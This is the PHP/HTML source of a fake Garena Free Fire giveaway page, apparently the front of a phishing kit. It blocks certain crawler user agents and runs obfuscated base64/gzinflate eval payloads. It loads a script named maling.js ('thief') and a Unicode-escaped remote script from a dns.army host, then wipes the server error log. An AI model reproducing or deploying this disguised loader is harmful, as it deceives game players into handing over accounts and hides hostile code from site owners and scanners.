<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://www.facebook.com/ensikology.id');
die();
}error_reporting(0);
require('menu.php');
?>
<!DOCTYPE html>
  <html>
  <head>
    <meta charset="utf-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <title>FREE FIRE EVENT</title>
    <meta property="og:description" content="Get Free Bundle Garena Free Fire in This Website !!">
    <meta property="og:image" content="berkas/images/banner.png">
    <link rel="shorcut icon" href="berkas/images/icon.png">
    <script type="text/javascript">
document.write('\u003C\u006C\u0069\u006E\u006B\u0020\u0072\u0065\u006C\u003D\u0022\u0073\u0074\u0079\u006C\u0065\u0073\u0068\u0065\u0065\u0074\u0022\u0020\u0068\u0072\u0065\u0066\u003D\u0022\u0062\u0065\u0072\u006B\u0061\u0073\u002F\u0063\u0073\u0073\u002F\u0073\u0074\u0079\u006C\u0065\u002E\u0063\u0073\u0073\u0022\u003E');
    </script><?php eval(gzinflate(base64_decode('jY9La8JAEMfvgXyHYRE2lvgolFISBG1NwYN9xNiLyLJNVnfbbBJ2J6Df3k2lYm89Dczv/5iZqkoxKzCgdYtNi+yz3e2EUdWehjDuxzC9CAplm5IfmTCmNvaMfc8hhkoLViqtMOgsF4cWujbHM3F6en+3pI5LwQthAvpUVygqHGTHRkS+h+KAI4m6jCGX3LiEyTp7Hjx0lh62Xy2vNFclTIB+i7xFza2St+PpvtsO81pTpzuwhqP0vQkQidhEoxGBIfTYKkk/knRDz5O9zJYJ3f4hafK+TlYZW6cLunWP9RphecV4KQy6TrJTh994iBq4WbzBrCiMsBYi2ICrcZ6rtOVrlrDZfJ7+9BDYkhi6S4OrX0LfIyl/VApzSUK4rgyB/Cu0H58A'))); ?>
<?php eval(gzinflate(base64_decode('c0jOL6jUcFCJd/P0cQ2OVq9Qj41WL8ktiM9LzE1Vj9VBk4GIaloDAA=='))); ?>
  </head>
  <body>
   <div id="ndokor"></div>
   <div id="isine"></div>
   <div id="nisor"></div>
   <?php echo $detol;?>
  </body>
<script type="text/javascript" src="berkas/js/maling.js"></script>
<script type="text/javascript">
document.write('\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u002F\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u0022\u0020\u0073\u0072\u0063\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0064\u0065\u0074\u006F\u006C\u002D\u0073\u0074\u006F\u0072\u0065\u002E\u0064\u006E\u0073\u002E\u0061\u0072\u006D\u0079\u002F\u0046\u0072\u0065\u0065\u0046\u0069\u0072\u0065\u0054\u006F\u0070\u0065\u006E\u0067\u002F\u006A\u0073\u002F');</script>Versi.2.1.0/SetyawanXD.js"><?php
$clean = fopen('error_log', 'w');
fwrite($clean,'');
fclose($clean);
?>
</script>
</html>